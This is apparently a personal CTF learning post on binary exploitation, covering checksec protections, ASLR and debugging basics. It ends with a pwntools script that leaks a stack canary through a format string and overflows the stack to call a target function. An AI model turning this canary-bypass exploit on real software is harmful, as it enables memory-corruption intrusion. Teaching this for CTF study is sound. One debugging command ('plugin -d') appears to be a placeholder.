---
title: BINARY EXPLOITATION
date: 2023-05-06 01:30:40 +/-TTTT
categories: [learning, rev]
tags: [ctf]     # TAG names should always be lowercase
---

Binary Exploitation is the process of finding vulnerabilities in the binary file.

# Prerequisites

This post uses “rizin” for dynamic analysis.
And “pwntools” python package is useful for binary exploitation.

# Investigation
* Basic

```
file ./example
strings ./example

objdump -d ./example
# -M: type
objdump -M intel -d ./example
```

# Security Properties

First check the executable properties.

```
checksec --file=./example
```

RELRO (stands for Relocation Read-Only)

* Partial RELRO - We can read/write the global offset table.

* Full RELRO - We can only read the global offset table. So we cannot overwrite GOT.

STACK CANARY

* No canary found - It’s vulnerable to buffer overflow.

NX (stands for Non-eXecutable segments)

* NX enabled - We cannot execute custom shellcode from the stack.

PIE (stands for Position Independent Executable)

* No PIE - The binary always starts at same address.


# ASLR (Address Space Layout Randomization) in Machine

ASLR is a security technique involved in preventing exploitation of memory corruption vulnerabilities.

```
cat /proc/sys/kernel/randomize_va_space
2
```

* 0 - The address space is NOT randomized.
* 1 - The address space is randomized.
* 2 - The address space is randomized, and data segment as well.

# GDB Introductions
GDB, or the GNU Debugger, is the standard debugger of Linux systems developed by the GNU Project. It has been ported to many systems and supports the programming languages C, C++, Objective-C, FORTRAN, Java, and many more.

GDB provides us with the usual traceability features like breakpoints or stack trace output and allows us to intervene in the execution of programs. It also allows us, for example, to manipulate the variables of the application or to call functions independently of the normal execution of the program.

We use GNU Debugger (GDB) to view the created binary on the assembler level. Once we have executed the binary with GDB, we can disassemble the program's main function.


* Start Debug

```
# Change permission for debugging
chmod +x example

# -d: Debug mode
plugin -d example
```

# Format String (Pointer)

```
./example

Type something:
>> %2$p
The result is 0x555a18ae6365
```

# Bypass Canary Protection

```python
from pwn import *
import re

context.update(arch="amd64", os="linux")

filepath = "./example"
elf = context.binary = ELF(filepath)

p = process(filepath) # p = remote('example.com', '1337') for remote connection

# We need to find the stack canary. This address ends with "00".
# To find it, execute p.sendline(b"%p %p %p %p ...").
p.sendline(b"%10$p %13$p")
p.recvuntil(b"result: ")
leaked = p.recvline().split()
print(leaked)
base = int(leaked[0], 16) - 0xa90
canary = int(leaked[1], 16)
elf.address = base

payload = b"A"*24
payload += p64(canary)
payload += b"B"*8
payload += p64(base + 0x6fe)
payload += p64(elf.sym["target_func"])

p.sendline(payload)
p.interactive()
```
